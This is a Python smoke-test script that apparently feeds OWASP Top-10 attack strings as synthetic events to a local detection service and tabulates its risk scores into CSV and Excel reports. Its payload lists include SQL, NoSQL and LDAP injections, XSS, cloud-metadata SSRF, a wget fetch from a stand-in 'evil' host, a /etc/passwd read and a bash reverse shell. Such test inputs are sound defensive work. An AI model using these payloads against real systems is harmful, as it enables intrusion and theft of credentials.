#!/usr/bin/env python3
import argparse
import csv
import datetime as dt
import json
import os
import sys
import time
import zlib
import requests

from typing import Any, Dict, List, Optional, Tuple
from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from collections import Counter

# ---- Config / Defaults (same as bash script) ----
DEFAULT_BASE_URL = os.getenv("URL_ORCH", "http://localhost:8000")
DEFAULT_PATH_PROCESS = os.getenv("PATH_PROCESS", "/process")
DEFAULT_ONLY = os.getenv("ONLY", "")
DEFAULT_TOKEN = os.getenv("ORCH_TOKEN", "")
DEFAULT_PRETTY = os.getenv("PRETTY", "1")
DEFAULT_SEED = os.getenv("SEED", "")
QUIET = os.getenv("QUIET", "0").strip().lower() in ("1", "true", "yes", "on")

FAKE_IPS_PUBLIC = ["198.51.100.10", "198.51.100.42", "203.0.113.7", "203.0.113.77", "192.0.2.23"]
FAKE_IPS_PRIVATE = ["10.0.5.12", "10.1.2.3", "172.16.22.8", "192.168.1.44"]
FAKE_USERS = ["alice", "bob", "carol", "dave", "erin", "admin", "root", "svc-app"]
FAKE_LATENCY = ["121", "436", "697", "321", "506", "405", "793", "233", "132", "549", "435"]


def say(msg: str) -> None:
    if QUIET:
        return
    sys.stdout.write(f"\n\033[1;36m### {msg}\033[0m\n")

def arr_index(key: str, size: int, seed: str) -> int:
    """Deterministic index [0..size-1] from key+seed (similar to cksum in bash)."""
    if size <= 0:
        return 0
    data = (key + seed).encode("utf-8")
    h = zlib.crc32(data) & 0xFFFFFFFF
    return h % size


def pick_public_ip(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_IPS_PUBLIC)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_IPS_PUBLIC[ndx]


def pick_private_ip(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_IPS_PRIVATE)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_IPS_PRIVATE[ndx]


def pick_user(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_USERS)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_USERS[ndx]

def pick_latency(group: str, idx: int, seed: str) -> str:
    n = len(FAKE_LATENCY)
    ndx = arr_index(f"{group}-{idx}", n, seed)
    return FAKE_LATENCY[ndx]

def build_event(
    payload: str,
    endpoint: str,
    method: str,
    source_ip: str,
    user_id: str,
    latency: str
) -> Dict[str, Any]:
    ts = dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    nonce = str(time.time_ns())
    return {
        "ts": ts,
        "endpoint": endpoint,
        "method": method,
        "headers": {"ct": "text"},
        "payload": payload,
        "latency_ms": latency,
        "trace_nonce": nonce,
        "source_ip": source_ip,
        "user_id": user_id or "",
    }


def pretty_json(obj: Any) -> str:
    try:
        return json.dumps(obj, ensure_ascii=False, indent=2)
    except Exception:
        return str(obj)


def send_request(
    session: requests.Session,
    url: str,
    detailed: bool,
    token: str,
    event: Dict[str, Any],
    attack_name: str,
    idx: int,
    pretty: bool,
) -> Tuple[str, Optional[Dict[str, Any]]]:
    endpoint = event.get("endpoint", "/?")
    method = event.get("method", "POST")

    say(f"{attack_name} #{idx} [{method} {endpoint}]")

    headers = {"Content-Type": "application/json"}
    if detailed and token:
        headers["X-Orch-Token"] = token

    body_obj = {"event": event}
    body_str = json.dumps(body_obj, ensure_ascii=False)
    query = "?detailed=1" if detailed else ""
    url_with_qs = f"{url}{query}"

    # Echo "curl" + body (skip in QUIET mode to reduce noise)
    if not QUIET:
        sys.stdout.write("# curl:\n")
        curl_parts = [
            "curl -sS -f",
            f'"{url_with_qs}"',
            "-H 'Content-Type: application/json'",
        ]
        if detailed and token:
            curl_parts.append(f"-H 'X-Orch-Token: {token}'")
        curl_parts.append("--data-binary @-")
        sys.stdout.write(" ".join(curl_parts) + "\n")
        sys.stdout.write(f"# endpoint: {method} {endpoint}\n")
        sys.stdout.write("# body:\n")
        sys.stdout.write(pretty_json(body_obj) + "\n")

    try:
        resp = session.post(
            url_with_qs,
            data=body_str.encode("utf-8"),
            headers=headers,
            timeout=15,
        )
    except Exception as e:
        sys.stdout.write(f"!! request failed for {attack_name}#{idx}: {e}\n")
        return "", None

    text = resp.text
    text_strip = text.strip()
    parsed: Optional[Dict[str, Any]] = None

    # try to parse JSON if present
    if text_strip.startswith("{") or text_strip.startswith("["):
        try:
            obj = json.loads(text_strip)
            if isinstance(obj, dict):
                parsed = obj
        except Exception:
            parsed = None

    # Print response (skip in QUIET mode to keep output compact)
    if not QUIET:
        if parsed is not None and detailed and pretty:
            sys.stdout.write(pretty_json(parsed) + "\n")
        else:
            sys.stdout.write(text_strip + "\n")
    return text_strip, parsed


def build_csv_row(
    event: Dict[str, Any],
    raw_response: str,
    parsed: Optional[Dict[str, Any]],
) -> Dict[str, Any]:
    row: Dict[str, Any] = {}

    # base fields
    row["timestamp"] = event.get("ts")
    row["endpoint"] = event.get("endpoint")
    row["method"] = event.get("method")
    row["payload"] = event.get("payload")
    row["latency_ms"] = event.get("latency_ms")
    row["trace_nonce"] = event.get("trace_nonce")
    row["source_ip"] = event.get("source_ip")
    row["user_id"] = event.get("user_id")
    row["attack_group"] = event.get("attack_group")

    # raw human / json
    row["response_raw"] = " ".join(raw_response.split())

    if not parsed:
        row["human_text"] = row["response_raw"]
        return row

    # if parsed (detailed JSON) – trying to pull human tex
    row["hash_id"] = (
        parsed.get("hash_id")
        or parsed.get("fusion", {}).get("hash_id")
        or parsed.get("preprocess", {}).get("hash_id")
    )

    fusion = parsed.get("fusion", {}) if isinstance(parsed, dict) else {}
    ml = parsed.get("ml", {}) if isinstance(parsed, dict) else {}
    nlp = parsed.get("nlp", {}) if isinstance(parsed, dict) else {}
    human = parsed.get("human", {}) if isinstance(parsed, dict) else {}

    row["final_score"] = fusion.get("final_score")
    row["final_threshold"] = fusion.get("final_threshold")
    row["ml_score"] = ml.get("ml_score")
    row["nlp_score"] = nlp.get("nlp_score")
    row["risk_level"] = fusion.get("risk_level") or human.get("risk_level")
    row["fusion_mode"] = fusion.get("mode")
    row["fusion_is_anomaly"] = fusion.get("is_anomaly")

    # topic / topic-score
    topics = (
        fusion.get("topics")
        or nlp.get("topics")
        or parsed.get("alert", {}).get("preview", {}).get("topic")
    )
    if isinstance(topics, list) and topics:
        t0 = topics[0]
        row["topic"] = t0.get("topic")
        row["topic_score"] = t0.get("score")
    elif isinstance(topics, dict):
        row["topic"] = topics.get("topic")
        row["topic_score"] = topics.get("score")

    # Attack Type Identified
    row["attack_type_identified"] = row.get("topic")

    # Confidence
    conf = row.get("topic_score") or row.get("nlp_score") or row.get("final_score")
    row["confidence"] = conf

    # human_text in detailed mode
    row["human_text"] = (
        human.get("text")
        or parsed.get("human_text")
        or row.get("response_raw")
    )

    # risk context
    ctx = fusion.get("context") or parsed.get("preprocess", {}).get("risk_context") or {}
    if isinstance(ctx, dict):
        for k in ("env", "endpoint_class", "data_class", "auth_state", "exposure", "blast"):
            if k in ctx:
                row[k] = ctx[k]

    # route / thresholds
    route = parsed.get("route", {})
    if isinstance(route, dict):
        if route.get("ml_models") is not None:
            row["route_ml_models"] = ",".join(route.get("ml_models", []))
        if route.get("nlp_models") is not None:
            row["route_nlp_models"] = ",".join(route.get("nlp_models", []))
        fusion_cfg = route.get("fusion", {})
        if isinstance(fusion_cfg, dict):
            row["route_fusion_mode"] = fusion_cfg.get("mode")
        thresholds = route.get("thresholds", {})
        if isinstance(thresholds, dict):
            row["thr_ml"] = thresholds.get("ml")
            row["thr_nlp"] = thresholds.get("nlp")
            row["thr_final"] = thresholds.get("final")

    row["status"] = parsed.get("status")
    row["trace_id"] = parsed.get("trace_id") or ctx.get("trace_id")

    return row

def run_group(
    session: requests.Session,
    base_url: str,
    path_process: str,
    detailed: bool,
    token: str,
    pretty: bool,
    only_group: str,
    group_name: str,
    endpoint: str,
    method: str,
    payloads: List[str],
    seed: str,
    csv_rows: Optional[List[Dict[str, Any]]],
) -> None:

    if only_group and only_group != group_name:
        return

    url = base_url.rstrip("/") + path_process

    for idx, pl in enumerate(payloads, start=1):
        # IP/user selection logic is the same as in the bash script
        if group_name in {
            "sql_injection",
            "nosql_injection",
            "ldap_injection",
            "cmd_injection",
            "xss",
            "ssrf",
            "websocket",
            "ssrf_sensitive",
            "business_logic",
            "api_key_exposure",
        }:
            ip = pick_public_ip(group_name, idx, seed)
            user = ""
            latency = pick_latency(group_name, idx, seed)
        elif group_name in {"auth_bruteforce", "credential_stuffing"}:
            ip = pick_public_ip(group_name, idx, seed)
            user = "admin"
            latency = pick_latency(group_name, idx, seed)
        elif group_name == "idor":
            ip = pick_public_ip(group_name, idx, seed)
            user = f"user{idx}"
            latency = pick_latency(group_name, idx, seed)
        elif group_name in {"data_exposure", "misconfiguration"}:
            ip = pick_private_ip(group_name, idx, seed)
            user = pick_user(group_name, idx, seed)
            latency = pick_latency(group_name, idx, seed)
        elif group_name == "dos":
            ip = pick_public_ip(group_name, 1, seed)
            user = ""
            latency = pick_latency(group_name, idx, seed)
        else:
            ip = ""
            user = ""
            latency = pick_latency(group_name, idx, seed)

        event = build_event(pl, endpoint, method, ip, user, latency)
        event["attack_group"] = group_name
        raw, parsed = send_request(
            session=session,
            url=url,
            detailed=detailed,
            token=token,
            event=event,
            attack_name=group_name,
            idx=idx,
            pretty=pretty,
        )
        if csv_rows is not None:
            csv_rows.append(build_csv_row(event, raw_response=raw, parsed=parsed))

def main() -> None:
    parser = argparse.ArgumentParser(
        description="OWASP Top-10 smoke test, with optional CSV/XLSX export."
    )
    parser.add_argument("--url", default=DEFAULT_BASE_URL, help="Base Orchestrator URL (without /process)")
    parser.add_argument(
        "--path-process",
        default=DEFAULT_PATH_PROCESS,
        help="Path for the process endpoint (default: /process)",
    )
    parser.add_argument(
        "--detailed",
        action="store_true",
        help="Call /process?detailed=1 (X-Orch-Token recommended).",
    )
    parser.add_argument(
        "--only",
        default=DEFAULT_ONLY,
        help="Run only one group (sql_injection, xss, dos, business_logic...).",
    )
    parser.add_argument(
        "--token",
        default=DEFAULT_TOKEN,
        help="Override ORCH_TOKEN from env.",
    )
    parser.add_argument(
        "--no-pretty",
        action="store_true",
        help="Do not pretty-print JSON, even in detailed mode.",
    )
    parser.add_argument(
        "--csv-out",
        default="",
        help="Write results to CSV at this path (if omitted — CSV is not written).",
    )
    parser.add_argument(
        "--xlsx-out",
        "--xslx",              # to work even if --xslx is used
        dest="xlsx_out",
        default="",
        help="Write results to Excel (.xlsx) at this path.",
    )
    parser.add_argument(
        "--seed",
        default=DEFAULT_SEED,
        help="Seed for deterministic selection of IP/user.",
    )
    parser.add_argument(
        "--loops",
        type=int,
        default=1,
        help="How many times to repeat the full set of OWASP scenarios (default: 1).",
    )

    args = parser.parse_args()
    csv_out = (args.csv_out or "").strip()
    xlsx_out = (args.xlsx_out or "").strip()

    base_url = args.url
    path_process = args.path_process
    only_group = (args.only or "").strip()
    token = args.token.strip()
    detailed = bool(args.detailed)
    pretty = not args.no_pretty and DEFAULT_PRETTY != "0"
    seed = args.seed or ""
    loops = max(1, int(args.loops))

    url_full = base_url.rstrip("/") + path_process
    print(f"Target Orchestrator URL: {url_full}")
    
    t_start = time.perf_counter()

    # ---- payloads (same as bash version) ----
    SQLI = [
        "admin' OR '1'='1' --",
        "UNION SELECT username, password FROM users--",
        "';waitfor delay '0:0:3'--",
        "admin' or 1=1;--",
        "admin' OR '1'='1' --",
        "admin' or '1'='1' /*x*/",
        "' or 1=1 LIMIT 1 --",
        "' or sleep(5)--",
        "';waitfor delay '0:0:3'--",
        "') or sleep(2)='",
        "' or 'a'='a' --",
        "UNION SELECT 1,2,3--",
        "unIoN/**/SeLeCt user,pass frOm users--",
        "UNI/**/ON SEL/**/ECT @@version;--",
        "union all select null,null--",
    ]
    NOSQL = [
        "db.users.find({$where:'this.password != null'})",
        '{"user":{"$ne":null}, "role":{"$gt":1}}',
        "db.users.find({$or:[{admin:true},{role:{$gt:1}}]})",
        "{""""$or"""":[{""""locked"""":{""""$ne"""":true}},{""""login"""":{""""$ne"""":""""user""""}}]}",
        "{""""$and"""":[{""""user"""":{""""$ne"""":null}},{""""pwd"""":{""""$ne"""":null}}]}",
        "db.logs.aggregate([{""""$match"""":{""""$where"""":""""this.ip.startsWith('10.')""""}}])",
        "{""""$where"""":""""this.token && this.token.length>0""""}",
        "{""""$or"""":[{""""$where"""":""""this.isAdmin==true""""},{""""user"""":{""""$regex"""":"""".*""""}}]}",
        "db.auth.find({""""$or"""":[{""""email"""":{""""$ne"""":""""""""}},{""""pwd"""":{""""$ne"""":""""""""}}]})",
        "{""""$where"""":""""sleep(1000) || true""""}",
        "db.system.keys.find({""""$where"""":""""this.key != null""""})",
    ]
    LDAP = [
        "(uid=*)(userPassword=*)",
        "(|(cn=admin)(uid=admin))",
        "(&(objectClass=person)(uid=*))",
        "(|(cn=admin)(cn=root))",
    ]
    CMDI = [
        "; wget http://evil/file",
        "q=1 && cat /etc/passwd",
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "Nested command substitution: $(echo $(whoami))",
        "Inject sleep command for timing attack: & sleep 10",
    ]
    XSS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        ">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>",
        ">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-",
        ">""<a href=""javascript#document.cookie=true;"">",
        ">""<div onmouseover=""document.cookie=true;"">",
    ]
    SSRF = [
        "url=http://127.0.0.1:2375/containers/json",
        "target=http://localhost:8080/admin",
        "src=http://kubernetes.default.svc/metrics",
        "target=http://localhost:8080/admin",
        "callback=http://internal/api",
        "fetch=http://10.1.2.3:9000/private",
        "webhook=http://[::1]/debug",
        "target=http://unix:/var/run/docker.sock",
        "proxy=http://10.0.0.5:8080",
    ]
    API_KEYS = [
        "aws_access_key_id=AKIAABCDEFGHIJKLMNOP",
        "x-api-key=12345-ABCDE-67890-FGHIJ",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc",
    ]
    BRUTE = [
        "login failed for user admin (invalid password)",
        "too many failed logins for user",
        "account locked due to brute force",
        "account locked after 5 failed logins",
        "auth failure for user admin: too many attempts",
        "invalid credentials for admin from 10.0.0.6",
        "brute force detected: 50 failed logins in 5 minutes",
        "login failure count exceeded threshold for account admin",
    ]
    STUFF = [
        "credential stuffing detected for user admin (pwned list)",
        'multiple accounts tried with same password "qwerty" from leaked combos',
        "password reuse suspected for account root from breach dataset",
        "login surge with common password '123456'",
        "leaked credential list observed in authentication logs",
    ]
    IDOR = [
        "/profile?user_id=42 -> changed to user_id=43 returns other user's data",
        "/users/200 returns details for 201 after tampering",
        "/orders?order_id=1001 shows 1002 when parameter tampered",
        "GET /invoice?order_id=5001 returns someone else's invoice",
    ]
    MISCONF = [
        "Index of /public/",
        "X-Powered-By: Express",
        "Traceback (most recent call last):",
        "open CORS detected: Access-Control-Allow-Origin: *",
    ]
    DATAEXP = [
        "-----BEGIN PRIVATE KEY----- MIIC... -----END PRIVATE KEY-----",
        "SSN 123-45-6789 found in response",
        "Authorization: Bearer eyJ...verylongjwttoken...",
        "credit card 5555555555554444 exposed in response",
        "plaintext password field returned by API",
    ]
    DOS = [
        "429 Too Many Requests: rate limit exceeded",
        "slowloris pattern: many open connections",
        "http flood detected from single IP",
        "request timeout during heavy load",
        "connection pool exhaustion by long-lived requests",
        "timeouts spike during traffic flood",
        "DoS detected: excessive requests per second",
        "Slow client holding connections open",
        "Queue backlog increased dramatically",
    ]
    WS = [
        "Sec-WebSocket-Key: abc=",
        "ws://127.0.0.1:8000/socket.io/?EIO=3&transport=websocket",
    ]
    SSRF_META = [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    BIZ = [
        "apply coupon SAVE10 twice to get double discount",
        "race condition on checkout doubles refund",
        "bypass step validation to skip payment",
    ]

    csv_rows: List[Dict[str, Any]] = []

    with requests.Session() as session:
        for loop_idx in range(loops):
            if loops > 1:
                say(f"=== Loop {loop_idx + 1}/{loops} ===")

            # A03: SQLi
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "sql_injection", "/payments/charge", "POST", SQLI, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "sql_injection", "/api/v1/orders/search", "GET", SQLI, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "sql_injection", "/admin/reports/export", "GET",
                      SQLI, seed, csv_rows)

            # A03: NoSQL
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "nosql_injection", "/api/v1/users/search", "POST", NOSQL, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "nosql_injection", "/api/v2/audit/logs", "POST",
                      NOSQL, seed, csv_rows)

            # A03: LDAP
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "ldap_injection", "/internal/ldap/search", "POST", LDAP, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "ldap_injection", "/admin/directory/search", "POST",
                      LDAP, seed, csv_rows)

            # A03: CMD injection
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "cmd_injection", "/admin/tools/ping", "POST", CMDI, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "cmd_injection", "/admin/diag/traceroute", "POST",
                      CMDI, seed, csv_rows)

            # A03: XSS
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "xss", "/profile/update", "POST", XSS, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "xss", "/comments/post", "POST",
                      XSS, seed, csv_rows)

            # A10: SSRF
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "ssrf", "/fetch-url", "POST", SSRF, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "ssrf", "/webhook/test", "POST",
                      SSRF, seed, csv_rows)

            # A10: Cloud Metadata SSRF
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "ssrf_sensitive", "/metadata/fetch", "POST", SSRF_META, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "ssrf_sensitive", "/cloud/proxy", "POST",
                      SSRF_META, seed, csv_rows)

            # API key / sensitive data exposure
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "api_key_exposure", "/integrations/slack/callback", "POST", API_KEYS, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "api_key_exposure", "/api/v1/keys/rotate", "POST",
                      API_KEYS, seed, csv_rows)

            # Auth bruteforce
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "auth_bruteforce", "/auth/login", "POST", BRUTE, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "auth_bruteforce", "/api/v1/auth/login", "POST",
                      BRUTE, seed, csv_rows)

            # Credential stuffing
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "credential_stuffing", "/auth/login", "POST", STUFF, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "credential_stuffing", "/api/v1/auth/login", "POST",
                      STUFF, seed, csv_rows)

            # Broken access control / IDOR
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "idor", "/profile", "GET", IDOR, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "idor", "/admin/users/42", "GET",
                      IDOR, seed, csv_rows)

            # Security Misconfiguration
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "misconfiguration", "/", "GET", MISCONF, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "misconfiguration", "/debug/routes", "GET",
                      MISCONF, seed, csv_rows)

            # Data exposure
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "data_exposure", "/files/download", "GET", DATAEXP, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "data_exposure", "/reports/export", "GET",
                      DATAEXP, seed, csv_rows)

            # DoS
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "dos", "/api/v1/search", "GET", DOS, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "dos", "/login", "POST",
                      DOS, seed, csv_rows)

            # WebSocket abuse
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "websocket", "/ws/chat", "GET", WS, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "websocket", "/socket.io/", "GET",
                      WS, seed, csv_rows)

            # Business logic abuse
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "business_logic", "/cart/apply-coupon", "POST", BIZ, seed, csv_rows)
            run_group(session, base_url, path_process, detailed, token, pretty,
                      only_group, "business_logic", "/payments/refund", "POST",
                      BIZ, seed, csv_rows)

    total_events = len(csv_rows) if csv_rows is not None else 0

    # ---- build overall list of columns ----
    fieldnames_set = {k for row in csv_rows for k in row.keys()}

    base_order = [
        "timestamp",
        "endpoint",
        "method",
        "payload",
        "latency_ms",
        "trace_nonce",
        "source_ip",
        "user_id",
        "hash_id",
        "risk_level",
        "final_score",
        "final_threshold",
        "ml_score",
        "nlp_score",
        "topic",
        "topic_score",
        "attack_type_identified",
        "confidence",
        "env",
        "endpoint_class",
        "data_class",
        "auth_state",
        "exposure",
        "blast",
        "status",
        "trace_id",
        "route_ml_models",
        "route_nlp_models",
        "route_fusion_mode",
        "thr_ml",
        "thr_nlp",
        "thr_final",
        "response_raw",
        "human_text",
    ]

    ordered = [f for f in base_order if f in fieldnames_set]
    extra = sorted(fieldnames_set - set(ordered))
    fieldnames = ordered + extra

    # ---- CSV export (if requested) ----
    if csv_out:
        with open(csv_out, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for row in csv_rows:
                writer.writerow(row)
        print(f"\nCSV written to: {csv_out}")

    # ---- XLSX export (if requested) ----
    if xlsx_out:
        wb = Workbook()
        ws = wb.active
        ws.title = "owasp_runs"

        # header
        ws.append(fieldnames)
        # rows
        for row in csv_rows:
            ws.append([row.get(col) for col in fieldnames])

        # auto-fit column widths
        for idx, col in enumerate(fieldnames, start=1):
            col_letter = get_column_letter(idx)
            # all values in the column + header
            vals = [str(row.get(col, "")) for row in csv_rows]
            max_len = max([len(col)] + [len(v) for v in vals]) if vals else len(col)

            if col in ("payload", "response_raw", "human_text"):
                width = min(max_len + 2, 120)  # very long text fields
            else:
                width = min(max_len + 2, 60)   # typical technical fields

            ws.column_dimensions[col_letter].width = width

        # ---- summary sheet: detection quality by attack group ----
        stats = {}
        good_levels = {"medium", "high", "critical"}

        for row in csv_rows:
            g = row.get("attack_group") or row.get("topic") or row.get("attack_type_identified")
            if not g:
                continue
            risk = str(row.get("risk_level") or "").lower()
            topic = row.get("topic")

            if g not in stats:
                stats[g] = {"total": 0, "good": 0, "topics": Counter()}

            stats[g]["total"] += 1
            if risk in good_levels:
                stats[g]["good"] += 1
            if topic:
                stats[g]["topics"][topic] += 1

        # mapping from internal group id to human-readable label and notes
        group_order = [
            "sql_injection",
            "nosql_injection",
            "ldap_injection",
            "cmd_injection",
            "xss",
            "ssrf",
            "ssrf_sensitive",
            "api_key_exposure",
            "auth_bruteforce",
            "credential_stuffing",
            "idor",
            "misconfiguration",
            "data_exposure",
            "dos",
            "websocket",
            "business_logic",
        ]
        group_labels = {
            "sql_injection": "SQL Injection",
            "nosql_injection": "NoSQL Injection",
            "ldap_injection": "LDAP Injection",
            "cmd_injection": "Command Injection",
            "xss": "Cross-Site Scripting",
            "ssrf": "SSRF",
            "ssrf_sensitive": "SSRF (metadata services)",
            "api_key_exposure": "API key exposure",
            "auth_bruteforce": "Authentication bruteforce",
            "credential_stuffing": "Credential stuffing",
            "idor": "IDOR",
            "misconfiguration": "Misconfiguration",
            "data_exposure": "Data exposure",
            "dos": "DoS",
            "websocket": "WebSocket abuse",
            "business_logic": "Business logic abuse",
        }
        group_notes = {
            "ssrf_sensitive": "elevated impact due to policy",
            "websocket": "often high/critical",
            "business_logic": "often high/critical",
        }

        ws_sum = wb.create_sheet(title="summary")
        header_sum = [
            "Attack group",
            "#events",
            "% with risk_level \u2265 medium",
            "Topic identified (majority)",
            "Notes",
        ]
        ws_sum.append(header_sum)

        for g in group_order:
            data = stats.get(g, {"total": 0, "good": 0, "topics": Counter()})
            total = data["total"]
            good = data["good"]
            if total > 0:
                pct = round((good / total) * 100.0, 1)
            else:
                pct = 0.0
            if data["topics"]:
                topic_major, _ = data["topics"].most_common(1)[0]
            else:
                topic_major = ""

            ws_sum.append([
                group_labels.get(g, g),
                total,
                pct,
                topic_major,
                group_notes.get(g, ""),
            ])

        # auto-fit column widths on summary sheet
        for idx, col in enumerate(header_sum, start=1):
            col_letter = get_column_letter(idx)
            vals = [str(ws_sum.cell(row=r, column=idx).value or "") for r in range(1, ws_sum.max_row + 1)]
            max_len = max(len(col), *(len(v) for v in vals)) if vals else len(col)
            ws_sum.column_dimensions[col_letter].width = min(max_len + 2, 60)

        wb.save(xlsx_out)
        print(f"XLSX written to: {xlsx_out}")

    t_end = time.perf_counter()
    elapsed = t_end - t_start

    if total_events > 0:
        events_per_sec = total_events / elapsed
        ms_per_event = (elapsed / total_events) * 1000.0
        print(
            f"\nProcessed {total_events} events in {elapsed:.3f}s "
            f"(~{ms_per_event:.1f} ms/event, {events_per_sec:.1f} events/sec)"
        )

    print("\n\033[1;32mDone.\033[0m")

if __name__ == "__main__":
    main()